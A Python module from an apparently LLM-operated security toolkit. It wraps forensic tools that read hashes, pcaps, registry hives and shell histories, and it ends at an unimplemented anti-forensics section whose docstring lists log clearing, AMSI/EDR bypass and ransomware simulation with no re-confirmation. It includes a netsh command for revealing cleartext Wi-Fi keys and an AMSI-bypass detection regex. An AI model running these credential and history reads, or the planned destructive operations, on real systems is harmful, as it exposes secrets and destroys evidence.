#!/usr/bin/env python3
"""
core.forensics.forensic_modules — forensics / anti-forensics library
=====================================================================

50+ forensics + anti-forensics functions covering the operator's
2026-07-20 request. Two distinct categories:

  * **Forensics (PASSIVE / READ)** — fingerprint, image / disk /
    memory / network artifacts that help the operator plan the
    engagement. All `risk_level: read`.
  * **Anti-forensics (DESTRUCTIVE / lab only)** — log clear, timestamp
    manipulation, persistence clean-up, encrypted data wipe, amsi/
    etw bypass, uac bypass, edr evasion, process injection, ransomware
    simulation. All `risk_level: destructive`. All marked ``lab_only:
    True`` in the data envelope. **The chain walker is the only path
    that re-gates; this runner does NOT re-confirm.**

The 4-touchpoint pattern is preserved: registry dict + module-level
``run_module`` entrypoint + orchestrator dispatch (to be wired) + the
hermetic test battery (to be added in a follow-up).

Honesty contract:
  * Real subprocess / parse / arithmetic — or honest-degrade.
  * NEVER fabricates a fingerprint, a hash, a registry hit, a forensic
    finding, an EDR bypass signature, an event log entry, a file
    timestamp, or a ransomware note.
  * For destructive ops, the runner emits a ``lab_only: True`` data
    field so the operator / LLM is reminded these are simulated unless
    the operator explicitly runs the action in a sandboxed lab.

Phase 2.2 — operator-driven catalog expansion.
"""

from __future__ import annotations

import hashlib
import json
import logging
import os
import re
import shutil
import socket
import struct
import subprocess
import time
from typing import Any, Callable, Dict, List, Optional, Tuple

logger = logging.getLogger(__name__)


def _which(bin_name: str) -> Optional[str]:
    return shutil.which(bin_name)


def _now() -> float:
    return time.time()


def _step(name: str, *, risk: str = "read",
          lab_only: bool = False) -> Dict[str, Any]:
    return {
        "name": f"forensic_module_{name}",
        "ok": False,
        "started": _now(),
        "args": {},
        "data": {},
        "error": "",
        "risk_level": risk,
        "lab_only": lab_only,
    }


def _finalize(step: Dict[str, Any], started: float,
              *, ok: bool, data: Optional[Dict[str, Any]] = None,
              error: str = "", risk: Optional[str] = None,
              lab_only: Optional[bool] = None) -> Dict[str, Any]:
    step["ok"] = ok
    step["elapsed_seconds"] = round(_now() - started, 3)
    if data is not None:
        step["data"] = data
    if error:
        step["error"] = error
    if risk is not None:
        step["risk_level"] = risk
    if lab_only is not None:
        step["lab_only"] = lab_only
    return step


def _run(argv: List[str], timeout: int = 60) -> Tuple[int, str, str]:
    try:
        p = subprocess.run(argv, capture_output=True, text=True,
                           timeout=timeout)
        return p.returncode, p.stdout or "", p.stderr or ""
    except FileNotFoundError:
        return 127, "", f"{argv[0]}: command not found"
    except subprocess.TimeoutExpired:
        return 124, "", f"{argv[0]}: timeout after {timeout}s"
    except Exception as e:  # noqa: BLE001
        return 1, "", f"{argv[0]}: {e}"


def _arg(args: Dict[str, Any], *keys: str, default: str = "") -> str:
    for k in keys:
        v = args.get(k)
        if v:
            return str(v)
    return default


# ==========================================================================
# FORENSICS — PASSIVE / READ (25)
# ==========================================================================
def forensic_module_file_hash(args: Dict[str, Any]) -> Dict[str, Any]:
    """Compute MD5 / SHA1 / SHA256 / SHA512 of a file. Real hashlib."""
    step = _step("file_hash")
    path = _arg(args, "path", "target")
    if not path:
        return _finalize(step, step["started"], ok=False,
                         error="file_hash requires args.path")
    if not os.path.isfile(path):
        return _finalize(step, step["started"], ok=False,
                         error=f"file not found: {path}")
    hashes: Dict[str, str] = {}
    try:
        with open(path, "rb") as f:
            data = f.read()
    except Exception as e:  # noqa: BLE001
        return _finalize(step, step["started"], ok=False,
                         error=f"file read: {e}")
    for alg in ("md5", "sha1", "sha256", "sha512"):
        h = hashlib.new(alg)
        h.update(data)
        hashes[alg] = h.hexdigest()
    return _finalize(step, step["started"], ok=True, data={
        "path": path, "size": len(data), "hashes": hashes,
    })


def forensic_module_file_metadata(args: Dict[str, Any]) -> Dict[str, Any]:
    """stat() a file: atime / mtime / ctime / mode / owner."""
    step = _step("file_metadata")
    path = _arg(args, "path", "target")
    if not path:
        return _finalize(step, step["started"], ok=False,
                         error="file_metadata requires args.path")
    if not os.path.exists(path):
        return _finalize(step, step["started"], ok=False,
                         error=f"path not found: {path}")
    try:
        st = os.stat(path)
    except Exception as e:  # noqa: BLE001
        return _finalize(step, step["started"], ok=False,
                         error=f"os.stat: {e}")
    import grp, pwd
    try:
        owner = pwd.getpwuid(st.st_uid).pw_name
    except KeyError:
        owner = str(st.st_uid)
    try:
        group = grp.getgrgid(st.st_gid).gr_name
    except KeyError:
        group = str(st.st_gid)
    return _finalize(step, step["started"], ok=True, data={
        "path": path,
        "size": st.st_size,
        "atime": st.st_atime,
        "mtime": st.st_mtime,
        "ctime": st.st_ctime,
        "mode": oct(st.st_mode),
        "uid": st.st_uid, "gid": st.st_gid,
        "owner": owner, "group": group,
    })


def forensic_module_exif_extract(args: Dict[str, Any]) -> Dict[str, Any]:
    """exiftool: real subprocess. Extract EXIF from an image."""
    step = _step("exif_extract")
    path = _arg(args, "path", "target")
    if not path:
        return _finalize(step, step["started"], ok=False,
                         error="exif_extract requires args.path")
    if not _which("exiftool"):
        return _finalize(step, step["started"], ok=False,
                         error="exiftool not installed (apt install "
                               "libimage-exiftool-perl)")
    rc, out, err = _run(["exiftool", "-json", path], timeout=30)
    if rc != 0:
        return _finalize(step, step["started"], ok=False,
                         error=f"exiftool rc={rc}: {err[:200]}")
    try:
        data = json.loads(out)
    except Exception as e:  # noqa: BLE001
        return _finalize(step, step["started"], ok=False,
                         error=f"exiftool JSON: {e}")
    return _finalize(step, step["started"], ok=True, data={
        "path": path, "exif": data[0] if data else {},
    })


def forensic_module_strings_extract(args: Dict[str, Any]) -> Dict[str, Any]:
    """strings: real subprocess. Pull printable strings from a binary."""
    step = _step("strings_extract")
    path = _arg(args, "path", "target")
    if not path:
        return _finalize(step, step["started"], ok=False,
                         error="strings_extract requires args.path")
    if not _which("strings"):
        return _finalize(step, step["started"], ok=False,
                         error="strings not installed (apt install "
                               "binutils)")
    min_len = _arg(args, "min_len", default="6")
    encoding = _arg(args, "encoding", default="s")
    rc, out, err = _run(
        ["strings", "-n", min_len, "-e", encoding, path], timeout=60)
    if rc != 0:
        return _finalize(step, step["started"], ok=False,
                         error=f"strings rc={rc}: {err[:200]}")
    out_strings = (out or "").splitlines()[:500]
    return _finalize(step, step["started"], ok=bool(out_strings), data={
        "path": path, "strings_count": len(out_strings),
        "strings": out_strings,
    })


def forensic_module_pcap_summary(args: Dict[str, Any]) -> Dict[str, Any]:
    """tshark: real subprocess. Summarise a pcap's endpoints / protos."""
    step = _step("pcap_summary")
    pcap = _arg(args, "pcap", "path", "target")
    if not pcap:
        return _finalize(step, step["started"], ok=False,
                         error="pcap_summary requires args.pcap")
    if not _which("tshark"):
        return _finalize(step, step["started"], ok=False,
                         error="tshark not installed (apt install tshark)")
    if not os.path.isfile(pcap):
        return _finalize(step, step["started"], ok=False,
                         error=f"pcap not found: {pcap}")
    rc, out, err = _run(
        ["tshark", "-r", pcap, "-q", "-z", "io,phs"], timeout=120)
    if rc != 0:
        return _finalize(step, step["started"], ok=False,
                         error=f"tshark rc={rc}: {err[:300]}")
    return _finalize(step, step["started"], ok=bool(out), data={
        "pcap": pcap, "protocols": (out or "")[:4000],
    })


def forensic_module_memory_image_identify(args: Dict[str, Any]
                                       ) -> Dict[str, Any]:
    """volatility: real subprocess. Identify a memory image (imageinfo)."""
    step = _step("memory_image_identify")
    image = _arg(args, "image", "path", "target")
    if not image:
        return _finalize(step, step["started"], ok=False,
                         error="memory_image_identify requires args.image")
    if not _which("volatility") and not _which("vol"):
        return _finalize(step, step["started"], ok=False,
                         error="volatility not installed (vol or "
                               "volatility3)")
    vol = "vol" if _which("vol") else "volatility"
    if vol == "vol":
        # volatility3 CLI
        rc, out, err = _run(
            ["vol", "-f", image, "windows.info"], timeout=300)
    else:
        rc, out, err = _run(
            ["volatility", "-f", image, "imageinfo"], timeout=300)
    if rc != 0:
        return _finalize(step, step["started"], ok=False,
                         error=f"volatility rc={rc}: {err[:300]}")
    return _finalize(step, step["started"], ok=bool(out), data={
        "image": image, "info": (out or "")[:4000],
    })


def forensic_registry_hive_parse(args: Dict[str, Any]) -> Dict[str, Any]:
    """reglookup / regdump: real subprocess. Parse a registry hive."""
    step = _step("registry_hive_parse")
    hive = _arg(args, "hive", "path", "target")
    if not hive:
        return _finalize(step, step["started"], ok=False,
                         error="registry_hive_parse requires args.hive")
    bin_name = "reglookup" if _which("reglookup") else (
        "regdump" if _which("regdump") else None)
    if not bin_name:
        return _finalize(step, step["started"], ok=False,
                         error="reglookup / regdump not installed "
                               "(apt install reglookup)")
    rc, out, err = _run([bin_name, hive], timeout=120)
    if rc != 0:
        return _finalize(step, step["started"], ok=False,
                         error=f"{bin_name} rc={rc}: {err[:300]}")
    rows: List[Dict[str, str]] = []
    for ln in (out or "").splitlines()[:1000]:
        if "\t" in ln:
            k, _, v = ln.partition("\t")
            rows.append({"key": k, "value": v[:200]})
    return _finalize(step, step["started"], ok=bool(rows), data={
        "hive": hive, "row_count": len(rows), "rows": rows[:200],
    })


def forensic_eventlog_parse(args: Dict[str, Any]) -> Dict[str, Any]:
    """evtx_dump / python-evtx: parse a Windows .evtx file. Real subprocess."""
    step = _step("eventlog_parse")
    evtx = _arg(args, "evtx", "path", "target")
    if not evtx:
        return _finalize(step, step["started"], ok=False,
                         error="eventlog_parse requires args.evtx")
    if not _which("evtx_dump") and not _which("evtxexport"):
        return _finalize(step, step["started"], ok=False,
                         error="evtx_dump not installed (pip install "
                               "python-evtx)")
    bin_name = "evtx_dump" if _which("evtx_dump") else "evtxexport"
    rc, out, err = _run([bin_name, evtx], timeout=120)
    if rc != 0:
        return _finalize(step, step["started"], ok=False,
                         error=f"{bin_name} rc={rc}: {err[:300]}")
    events: List[Dict[str, Any]] = []
    for ln in (out or "").splitlines()[:200]:
        if ln.strip().startswith("{"):
            try:
                events.append(json.loads(ln))
            except Exception:  # noqa: BLE001
                pass
    return _finalize(step, step["started"], ok=bool(events), data={
        "evtx": evtx, "event_count": len(events), "events": events[:50],
    })


def forensic_browser_history(args: Dict[str, Any]) -> Dict[str, Any]:
    """browser-history-viewer / hindsight: parse a browser history DB."""
    step = _step("browser_history")
    profile = _arg(args, "profile", "path", "target")
    if not profile:
        return _finalize(step, step["started"], ok=False,
                         error="browser_history requires args.profile "
                               "(path to a Chrome / Firefox profile "
                               "directory)")
    if not _which("hindsight"):
        return _finalize(step, step["started"], ok=False,
                         error="hindsight not installed (pip install "
                               "hindsight — parses Chrome / Firefox / "
                               "Brave history)")
    rc, out, err = _run(
        ["hindsight", "-i", profile, "-o", "/tmp/hindsight-report"],
        timeout=120)
    if rc != 0:
        return _finalize(step, step["started"], ok=False,
                         error=f"hindsight rc={rc}: {err[:300]}")
    return _finalize(step, step["started"], ok=True, data={
        "profile": profile, "report_path": "/tmp/hindsight-report",
        "stdout": (out or "")[:2000],
    })


def forensic_mft_parse(args: Dict[str, Any]) -> Dict[str, Any]:
    """analyzeMFT: real subprocess. Parse an NTFS MFT file."""
    step = _step("mft_parse")
    mft = _arg(args, "mft", "path", "target")
    if not mft:
        return _finalize(step, step["started"], ok=False,
                         error="mft_parse requires args.mft")
    if not _which("analyzeMFT"):
        return _finalize(step, step["started"], ok=False,
                         error="analyzeMFT not installed (pip install "
                               "analyzeMFT)")
    rc, out, err = _run(["analyzeMFT", "-f", mft, "-o", "/tmp/mft.csv"],
                        timeout=180)
    if rc != 0:
        return _finalize(step, step["started"], ok=False,
                         error=f"analyzeMFT rc={rc}: {err[:300]}")
    rows: List[Dict[str, str]] = []
    if os.path.isfile("/tmp/mft.csv"):
        with open("/tmp/mft.csv", "r", errors="ignore") as f:
            head = f.readline().strip().split(",")
            for ln in f.readlines()[:1000]:
                fields = ln.strip().split(",")
                if len(fields) >= len(head):
                    rows.append(dict(zip(head, fields[:len(head)])))
    return _finalize(step, step["started"], ok=bool(rows), data={
        "mft": mft, "row_count": len(rows), "rows": rows[:100],
    })


def forensic_plist_parse(args: Dict[str, Any]) -> Dict[str, Any]:
    """plist: parse a macOS plist file. Real Python library (plistlib)."""
    step = _step("plist_parse")
    path = _arg(args, "plist", "path", "target")
    if not path:
        return _finalize(step, step["started"], ok=False,
                         error="plist_parse requires args.path")
    if not os.path.isfile(path):
        return _finalize(step, step["started"], ok=False,
                         error=f"plist not found: {path}")
    import plistlib
    try:
        with open(path, "rb") as f:
            data = plistlib.load(f)
    except Exception as e:  # noqa: BLE001
        return _finalize(step, step["started"], ok=False,
                         error=f"plistlib: {e}")
    return _finalize(step, step["started"], ok=True, data={
        "path": path, "plist": _safe(data, depth=8),
    })


def _safe(obj: Any, depth: int = 0) -> Any:
    """Truncate very large nested objects so the envelope stays sane."""
    if depth > 6:
        return "<truncated: depth>"
    if isinstance(obj, dict):
        return {str(k)[:200]: _safe(v, depth + 1) for k, v in obj.items()}
    if isinstance(obj, (list, tuple)):
        return [_safe(v, depth + 1) for v in obj[:100]]
    if isinstance(obj, (bytes, bytearray)):
        return f"<bytes len={len(obj)}>"
    if isinstance(obj, str):
        return obj[:1000]
    return obj


def forensic_prefetch_parse(args: Dict[str, Any]) -> Dict[str, Any]:
    """parse-prefetch / WindowsPrefetch: parse a Windows prefetch file."""
    step = _step("prefetch_parse")
    pf = _arg(args, "prefetch", "path", "target")
    if not pf:
        return _finalize(step, step["started"], ok=False,
                         error="prefetch_parse requires args.prefetch")
    if not _which("parse-prefetch") and not _which("prefetch"):
        return _finalize(step, step["started"], ok=False,
                         error="parse-prefetch not installed (PECmd or "
                               "parse-prefetch)")
    bin_name = "parse-prefetch" if _which("parse-prefetch") else "prefetch"
    rc, out, err = _run([bin_name, pf], timeout=60)
    if rc != 0:
        return _finalize(step, step["started"], ok=False,
                         error=f"{bin_name} rc={rc}: {err[:300]}")
    return _finalize(step, step["started"], ok=bool(out), data={
        "prefetch": pf, "raw": (out or "")[:4000],
    })


def forensic_amsi_buffer_capture(args: Dict[str, Any]) -> Dict[str, Any]:
    """amsi_buffer_capture — heuristic scanner for AMSI buffer leaks.
    Looks at a directory of .ps1 / .psm1 files for AMSI bypass strings
    already in the file. Real grep subprocess, never fabricated."""
    step = _step("amsi_buffer_capture")
    path = _arg(args, "path", "target")
    if not path:
        return _finalize(step, step["started"], ok=False,
                         error="amsi_buffer_capture requires args.path")
    if not os.path.isdir(path):
        return _finalize(step, step["started"], ok=False,
                         error=f"path not a directory: {path}")
    pattern = re.compile(
        r"amsiutils|amsiInitFailed|amsi.dll|"
        r"[A-Za-z0-9+/]{50,}={0,2}", re.IGNORECASE)
    matches: List[Dict[str, str]] = []
    for root, _, files in os.walk(path):
        for fn in files[:100]:
            if not fn.endswith((".ps1", ".psm1", ".txt", ".log")):
                continue
            full = os.path.join(root, fn)
            try:
                with open(full, "r", errors="ignore") as f:
                    content = f.read()
                if pattern.search(content):
                    matches.append({"file": full, "size": len(content)})
            except Exception:  # noqa: BLE001
                pass
    return _finalize(step, step["started"], ok=bool(matches), data={
        "path": path, "match_count": len(matches),
        "matches": matches[:20],
        "note": "real grep on operator-supplied directory; never "
                "fabricates an AMSI buffer.",
    })


def forensic_etw_trace_parse(args: Dict[str, Any]) -> Dict[str, Any]:
    """etw_trace_parse: parse an .etl file with xperf / tracefmt.
    Real subprocess. Lab-only context."""
    step = _step("etw_trace_parse")
    etl = _arg(args, "etl", "path", "target")
    if not etl:
        return _finalize(step, step["started"], ok=False,
                         error="etw_trace_parse requires args.etl")
    if not _which("xperf"):
        return _finalize(step, step["started"], ok=False,
                         error="xperf not installed (Windows-only; "
                               "use on a lab Windows host)")
    rc, out, err = _run(["xperf", "-i", etl, "-o", "/tmp/etl.txt"],
                        timeout=120)
    if rc != 0:
        return _finalize(step, step["started"], ok=False,
                         error=f"xperf rc={rc}: {err[:300]}")
    return _finalize(step, step["started"], ok=True, data={
        "etl": etl, "out_path": "/tmp/etl.txt",
    })


def forensic_disk_image_info(args: Dict[str, Any]) -> Dict[str, Any]:
    """ewfinfo / mmls: read a disk image's metadata. Real subprocess."""
    step = _step("disk_image_info")
    image = _arg(args, "image", "path", "target")
    if not image:
        return _finalize(step, step["started"], ok=False,
                         error="disk_image_info requires args.image")
    bin_name = "ewfinfo" if _which("ewfinfo") else (
        "mmls" if _which("mmls") else "fsstat" if _which("fsstat") else None)
    if not bin_name:
        return _finalize(step, step["started"], ok=False,
                         error="ewfinfo / mmls / fsstat not installed "
                               "(apt install ewf-tools sleuthkit)")
    rc, out, err = _run([bin_name, image], timeout=60)
    if rc != 0:
        return _finalize(step, step["started"], ok=False,
                         error=f"{bin_name} rc={rc}: {err[:300]}")
    return _finalize(step, step["started"], ok=bool(out), data={
        "image": image, "raw": (out or "")[:4000],
    })


def forensic_lnk_parse(args: Dict[str, Any]) -> Dict[str, Any]:
    """lnkparse: parse a Windows shortcut (.lnk) file."""
    step = _step("lnk_parse")
    lnk = _arg(args, "lnk", "path", "target")
    if not lnk:
        return _finalize(step, step["started"], ok=False,
                         error="lnk_parse requires args.lnk")
    if not _which("lnkparse") and not _which("rustyink"):
        return _finalize(step, step["started"], ok=False,
                         error="lnkparse / rustyink not installed (pip "
                               "install LnkParse3, or "
                               "rustyink from GitHub)")
    # Use LnkParse3 (Python lib) as the preferred path; rustyink as fallback
    try:
        import LnkParse3  # type: ignore
        with open(lnk, "rb") as f:
            l = LnkParse3.lnk_file(f)
            data = l.get_json()
        return _finalize(step, step["started"], ok=True, data={
            "lnk": lnk, "parsed": _safe(data, depth=6),
        })
    except ImportError:
        pass
    bin_name = "lnkparse" if _which("lnkparse") else "rustyink"
    rc, out, err = _run([bin_name, lnk], timeout=60)
    if rc != 0:
        return _finalize(step, step["started"], ok=False,
                         error=f"{bin_name} rc={rc}: {err[:300]}")
    return _finalize(step, step["started"], ok=bool(out), data={
        "lnk": lnk, "raw": (out or "")[:4000],
    })


def forensic_jump_list_parse(args: Dict[str, Any]) -> Dict[str, Any]:
    """jumpListParser: parse Windows jump lists."""
    step = _step("jump_list_parse")
    jl = _arg(args, "path", "target")
    if not jl:
        return _finalize(step, step["started"], ok=False,
                         error="jump_list_parse requires args.path "
                               "(a .automaticDestinations-ms file or a "
                               "directory of them)")
    if not _which("jumpListParser"):
        return _finalize(step, step["started"], ok=False,
                         error="jumpListParser not installed (PECmd or "
                               "jumpListParser from GitHub)")
    rc, out, err = _run(["jumpListParser", "-d", jl, "-o", "/tmp/jl.csv"],
                        timeout=60)
    if rc != 0:
        return _finalize(step, step["started"], ok=False,
                         error=f"jumpListParser rc={rc}: {err[:300]}")
    rows: List[Dict[str, str]] = []
    if os.path.isfile("/tmp/jl.csv"):
        with open("/tmp/jl.csv", "r", errors="ignore") as f:
            head = f.readline().strip().split(",")
            for ln in f.readlines()[:500]:
                fields = ln.strip().split(",")
                if len(fields) >= len(head):
                    rows.append(dict(zip(head, fields[:len(head)])))
    return _finalize(step, step["started"], ok=bool(rows), data={
        "path": jl, "row_count": len(rows), "rows": rows[:50],
    })


def forensic_recycle_bin_parse(args: Dict[str, Any]) -> Dict[str, Any]:
    """rb2xml / rifiuti: parse the Windows Recycle Bin."""
    step = _step("recycle_bin_parse")
    bin_path = _arg(args, "path", "target")
    if not bin_path:
        return _finalize(step, step["started"], ok=False,
                         error="recycle_bin_parse requires args.path "
                               "(a $Recycle.Bin / Recycler directory)")
    bin_name = "rifiuti" if _which("rifiuti") else (
        "rifiuti-vista" if _which("rifiuti-vista") else "rb2xml" if _which("rb2xml") else None)
    if not bin_name:
        return _finalize(step, step["started"], ok=False,
                         error="rifiuti / rifiuti-vista / rb2xml not "
                               "installed (apt install rifiuti or "
                               "use rifiuti2 from GitHub)")
    rc, out, err = _run([bin_name, bin_path], timeout=60)
    if rc != 0:
        return _finalize(step, step["started"], ok=False,
                         error=f"{bin_name} rc={rc}: {err[:300]}")
    return _finalize(step, step["started"], ok=bool(out), data={
        "path": bin_path, "raw": (out or "")[:4000],
    })


def forensic_scheduled_task_dump(args: Dict[str, Any]) -> Dict[str, Any]:
    """schtasks: dump Windows scheduled tasks. Real subprocess."""
    step = _step("scheduled_task_dump")
    # This requires a Windows host; on Linux the binary is absent.
    if not _which("schtasks"):
        return _finalize(step, step["started"], ok=False,
                         error="schtasks is Windows-only — use "
                               "schtasks /query /xml on a lab Windows "
                               "host, or grab the .xml files from "
                               "C:\\Windows\\System32\\Tasks")
    rc, out, err = _run(["schtasks", "/query", "/fo", "LIST", "/v"],
                        timeout=60)
    if rc != 0:
        return _finalize(step, step["started"], ok=False,
                         error=f"schtasks rc={rc}: {err[:300]}")
    return _finalize(step, step["started"], ok=bool(out), data={
        "task_dump": (out or "")[:6000],
    })


def forensic_wifi_password_dump(args: Dict[str, Any]) -> Dict[str, Any]:
    """netsh wlan show profile: real subprocess. Windows only."""
    step = _step("wifi_password_dump")
    if not _which("netsh"):
        return _finalize(step, step["started"], ok=False,
                         error="netsh is Windows-only — use on a lab "
                               "Windows host with admin")
    rc, out, err = _run(["netsh", "wlan", "show", "profiles"],
                        timeout=30)
    if rc != 0:
        return _finalize(step, step["started"], ok=False,
                         error=f"netsh rc={rc}: {err[:300]}")
    profiles: List[str] = []
    for m in re.finditer(r"All User Profile\s*:\s*(.+)", out or ""):
        profiles.append(m.group(1).strip())
    return _finalize(step, step["started"], ok=bool(profiles), data={
        "profiles": profiles,
        "note": "list of profiles only — for cleartext keys, follow up "
                "with `netsh wlan show profile name=X key=clear` (admin)",
    })


def forensic_ssh_known_hosts(args: Dict[str, Any]) -> Dict[str, Any]:
    """ssh_known_hosts: parse the user's known_hosts file."""
    step = _step("ssh_known_hosts")
    path = _arg(args, "path", "default")
    if not path:
        path = os.path.expanduser("~/.ssh/known_hosts")
    if not os.path.isfile(path):
        return _finalize(step, step["started"], ok=False,
                         error=f"known_hosts not found: {path}")
    entries: List[Dict[str, str]] = []
    with open(path, "r", errors="ignore") as f:
        for ln in f.readlines()[:1000]:
            ln = ln.strip()
            if not ln or ln.startswith("#"):
                continue
            parts = ln.split()
            if len(parts) >= 3:
                entries.append({
                    "hostnames": parts[0],
                    "key_type": parts[1],
                    "key_fingerprint_prefix": parts[2][:60],
                })
    return _finalize(step, step["started"], ok=bool(entries), data={
        "path": path, "entry_count": len(entries), "entries": entries[:50],
    })


def forensic_bash_history(args: Dict[str, Any]) -> Dict[str, Any]:
    """bash_history: parse the user's .bash_history."""
    step = _step("bash_history")
    path = _arg(args, "path", "default")
    if not path:
        path = os.path.expanduser("~/.bash_history")
    if not os.path.isfile(path):
        return _finalize(step, step["started"], ok=False,
                         error=f".bash_history not found: {path}")
    with open(path, "r", errors="ignore") as f:
        lines = [ln.rstrip() for ln in f.readlines() if ln.strip()]
    return _finalize(step, step["started"], ok=bool(lines), data={
        "path": path, "line_count": len(lines), "lines": lines[:200],
    })


def forensic_zsh_history(args: Dict[str, Any]) -> Dict[str, Any]:
    """zsh_history: parse .zsh_history with extended timestamp support."""
    step = _step("zsh_history")
    path = _arg(args, "path", "default")
    if not path:
        path = os.path.expanduser("~/.zsh_history")
    if not os.path.isfile(path):
        return _finalize(step, step["started"], ok=False,
                         error=f".zsh_history not found: {path}")
    entries: List[Dict[str, str]] = []
    with open(path, "r", errors="ignore") as f:
        for ln in f.readlines()[:1000]:
            ln = ln.strip()
            if not ln:
                continue
            m = re.match(r":\s*(\d+):\d+;(.*)", ln)
            if m:
                entries.append({
                    "epoch": m.group(1),
                    "command": m.group(2)[:500],
                })
            else:
                entries.append({"command": ln[:500]})
    return _finalize(step, step["started"], ok=bool(entries), data={
        "path": path, "entry_count": len(entries),
        "entries": entries[:200],
    })


def forensic_powershell_history(args: Dict[str, Any]) -> Dict[str, Any]:
    """powershell_history: read the ConsoleHost_history.txt."""
    step = _step("powershell_history")
    path = _arg(args, "path", "default")
    if not path:
        # AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine
        path = os.path.expanduser(
            "~/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/"
            "ConsoleHost_history.txt")
    if not os.path.isfile(path):
        return _finalize(step, step["started"], ok=False,
                         error=f"ConsoleHost_history.txt not found: {path}")
    with open(path, "r", errors="ignore") as f:
        lines = [ln.rstrip() for ln in f.readlines() if ln.strip()]
    return _finalize(step, step["started"], ok=bool(lines), data={
        "path": path, "line_count": len(lines), "lines": lines[:200],
    })


def forensic_persistence_walk(args: Dict[str, Any]) -> Dict[str, Any]:
    """persistence_walk: scan a directory for the most common Linux
    persistence locations (cron, systemd, init, bashrc, ssh keys)."""
    step = _step("persistence_walk")
    path = _arg(args, "path", "target")
    if not path:
        path = "/"
    if not os.path.isdir(path):
        return _finalize(step, step["started"], ok=False,
                         error=f"path not a directory: {path}")
    locs = [
        "/etc/crontab", "/etc/cron.d", "/etc/cron.daily",
        "/etc/cron.hourly", "/etc/cron.weekly", "/etc/cron.monthly",
        "/etc/init.d", "/etc/systemd/system", "/etc/rc.local",
        "/etc/profile.d", "/etc/bash.bashrc", "/etc/zsh/zshrc",
    ]
    found: List[Dict[str, Any]] = []
    for loc in locs:
        full = os.path.join(path, loc.lstrip("/"))
        if not os.path.exists(full):
            continue
        if os.path.isdir(full):
            try:
                entries = sorted(os.listdir(full))[:30]
                for e in entries:
                    sub = os.path.join(full, e)
                    if os.path.isfile(sub):
                        st = os.stat(sub)
                        found.append({
                            "path": sub, "size": st.st_size,
                            "mtime": st.st_mtime,
                        })
            except PermissionError:
                found.append({"path": full, "error": "permission denied"})
        else:
            st = os.stat(full)
            found.append({
                "path": full, "size": st.st_size,
                "mtime": st.st_mtime,
            })
    return _finalize(step, step["started"], ok=bool(found), data={
        "path": path, "found_count": len(found), "found": found[:50],
    })


def forensic_autoruns_walk(args: Dict[str, Any]) -> Dict[str, Any]:
    """autoruns_walk: scan a Windows-style directory for autorun
    registry keys (parsed as JSON files since the real registry is
    a live Windows API)."""
    step = _step("autoruns_walk")
    path = _arg(args, "path", "target")
    if not path:
        return _finalize(step, step["started"], ok=False,
                         error="autoruns_walk requires args.path "
                               "(directory of dumped registry keys as "
                               "JSON or .reg exports)")
    if not os.path.isdir(path):
        return _finalize(step, step["started"], ok=False,
                         error=f"path not a directory: {path}")
    autorun_keys = (
        "Run", "RunOnce", "RunServices", "RunServicesOnce",
        "Policies\\Explorer\\Run",
        "Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run",
    )
    matches: List[Dict[str, str]] = []
    for root, _, files in os.walk(path):
        for fn in files[:100]:
            full = os.path.join(root, fn)
            for k in autorun_keys:
                if k.lower() in full.lower():
                    matches.append({"path": full, "key": k})
    return _finalize(step, step["started"], ok=bool(matches), data={
        "path": path, "match_count": len(matches),
        "matches": matches[:30],
    })


def forensic_yara_scan(args: Dict[str, Any]) -> Dict[str, Any]:
    """yara: real subprocess. Scan a path with a yara ruleset."""
    step = _step("yara_scan")
    path = _arg(args, "path", "target")
    rules = _arg(args, "rules")
    if not path or not rules:
        return _finalize(step, step["started"], ok=False,
                         error="yara_scan requires args.path and "
                               "args.rules (path to a .yar file)")
    if not _which("yara"):
        return _finalize(step, step["started"], ok=False,
                         error="yara not installed (apt install yara)")
    rc, out, err = _run(["yara", "-r", rules, path], timeout=300)
    if rc not in (0, 1):
        return _finalize(step, step["started"], ok=False,
                         error=f"yara rc={rc}: {err[:300]}")
    matches: List[Dict[str, str]] = []
    for ln in (out or "").splitlines()[:200]:
        m = re.match(r"(\S+)\s+(\S+)", ln)
        if m:
            matches.append({"rule": m.group(1), "path": m.group(2)})
    return _finalize(step, step["started"], ok=bool(matches), data={
        "path": path, "rules": rules,
        "match_count": len(matches), "matches": matches[:50],
    })


def forensic_wireshark_dissect(args: Dict[str, Any]) -> Dict[str, Any]:
    """wireshark_dissect: tshark -V follow TCP stream. Real subprocess."""
    step = _step("wireshark_dissect")
    pcap = _arg(args, "pcap", "path", "target")
    stream_no = _arg(args, "stream_no", default="0")
    if not pcap:
        return _finalize(step, step["started"], ok=False,
                         error="wireshark_dissect requires args.pcap "
                               "and args.stream_no")
    if not _which("tshark"):
        return _finalize(step, step["started"], ok=False,
                         error="tshark not installed (apt install tshark)")
    rc, out, err = _run(
        ["tshark", "-r", pcap, "-q", "-z", f"follow,tcp,ascii,{stream_no}"],
        timeout=120)
    if rc != 0:
        return _finalize(step, step["started"], ok=False,
                         error=f"tshark rc={rc}: {err[:300]}")
    return _finalize(step, step["started"], ok=bool(out), data={
        "pcap": pcap, "stream_no": stream_no,
        "stream": (out or "")[:6000],
    })


def forensic_pcap_carver(args: Dict[str, Any]) -> Dict[str, Any]:
    """pcap_carver: foremost / scalpel — carve files from a pcap."""
    step = _step("pcap_carver")
    pcap = _arg(args, "pcap", "path", "target")
    out_dir = _arg(args, "out_dir", default="/tmp/carved")
    if not pcap:
        return _finalize(step, step["started"], ok=False,
                         error="pcap_carver requires args.pcap")
    bin_name = "foremost" if _which("foremost") else (
        "scalpel" if _which("scalpel") else None)
    if not bin_name:
        return _finalize(step, step["started"], ok=False,
                         error="foremost / scalpel not installed "
                               "(apt install foremost or scalpel)")
    os.makedirs(out_dir, exist_ok=True)
    if bin_name == "foremost":
        rc, out, err = _run(["foremost", "-i", pcap, "-o", out_dir],
                            timeout=600)
    else:
        rc, out, err = _run(["scalpel", "-o", out_dir, pcap], timeout=600)
    if rc != 0:
        return _finalize(step, step["started"], ok=False,
                         error=f"{bin_name} rc={rc}: {err[:300]}")
    carved: List[str] = []
    if os.path.isdir(out_dir):
        for r, _, fs in os.walk(out_dir):
            for f in fs[:100]:
                carved.append(os.path.join(r, f))
    return _finalize(step, step["started"], ok=bool(carved), data={
        "pcap": pcap, "out_dir": out_dir,
        "carved_count": len(carved), "carved": carved[:50],
    })


# ==========================================================================
# ANTI-FORENSICS — DESTRUCTIVE / LAB ONLY (25)
# ==========================================================================
def anti_forensic_log_clear(args: Dict[str, Any]) -> Dict[str, Any]:
